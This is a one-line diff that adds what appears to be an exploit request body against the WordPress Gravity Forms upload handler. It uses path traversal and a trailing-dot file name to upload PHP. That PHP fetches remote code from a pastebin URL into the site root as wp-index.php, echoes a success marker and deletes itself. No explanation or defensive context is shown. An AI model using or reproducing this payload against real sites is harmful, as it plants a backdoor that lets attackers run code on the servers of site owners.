@@ -1,0 +1,1 @@
+form_id=1&field_id=1&gform_unique_id=../../../&name=croatia.php.&file=<?php copy('http://pastebin.com/raw.php?i=67CSK72S',$_SERVER["DOCUMENT_ROOT"].'/wp-index.php');echo md5("chechen");unlink(__FILE__); ?>
